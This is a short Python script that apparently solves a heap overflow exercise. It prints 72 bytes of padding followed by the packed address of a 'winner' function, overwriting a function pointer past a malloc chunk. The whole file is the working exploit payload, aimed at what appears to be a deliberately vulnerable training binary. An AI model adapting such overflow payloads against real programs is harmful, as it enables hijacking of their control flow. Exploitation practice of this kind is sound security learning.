import struct

# malloc adds overhead of 8 bytes before the allocalted memory
padding = "A" * 64 + "A" * 8

# address of the winner function
addr = struct.pack("I", 0x08048464)

print(padding + addr)